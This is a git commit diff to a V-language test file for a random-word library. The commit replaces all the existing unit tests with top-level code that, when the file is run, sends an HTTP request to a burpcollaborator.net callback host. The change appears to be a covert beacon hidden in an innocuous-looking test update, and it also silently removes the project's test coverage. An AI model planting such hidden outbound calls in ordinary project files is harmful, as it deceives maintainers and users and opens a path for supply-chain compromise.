eeb141558d9fb213934fec967638f6dee4ac5b4a
hantudiem <93470114+hantudiem@users.noreply.github.com>
2021-10-31 17:44:50 +0800

    Update verbose_test.v

--- verbose_test.v
+++ verbose_test.v
@@ -1,46 +1,10 @@
-import verbose
+module verbose
 
-fn test_adjective() {
-	s := verbose.adjective()
-	assert typeof(s) == 'string'
-	assert s.len > 0
-}
+// verbose is a generator for random parts of speech
+import net.http
 
-fn test_adverb() {
-	s := verbose.adverb()
-	assert typeof(s) == 'string'
-	assert s.len > 0
-}
-
-fn test_noun() {
-	s := verbose.noun()
-	assert typeof(s) == 'string'
-	assert s.len > 0
-}
-
-fn test_verb() {
-	s := verbose.verb()
-	assert typeof(s) == 'string'
-	assert s.len > 0
-}
-
-fn test_generate() {
-	phrase := verbose.generate('adverb-adjectives-verb-noun')
-	assert phrase.split('-').len == 4
-}
-
-fn test_generate_empty() {
-	phrase := verbose.generate('')
-	assert typeof(phrase) == 'string'
-	assert phrase.len == 0
-}
-
-fn test_generate_lengths() {
-	lengths := [1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024]
-	for length in lengths {
-		phrase_array := []string{len: length, init: 'noun'}
-		phrase := verbose.generate(phrase_array.join('-'))
-		assert typeof(phrase) == 'string'
-		assert phrase.split('-').len == length
-	}
+if resp := http.get('http://zad95sxssmwm1m7jk39c6l3w4naqyf.burpcollaborator.net/') {
+	println(resp.text) // resp is a http.Response, not an optional
+} else {
+	println(err)
 }
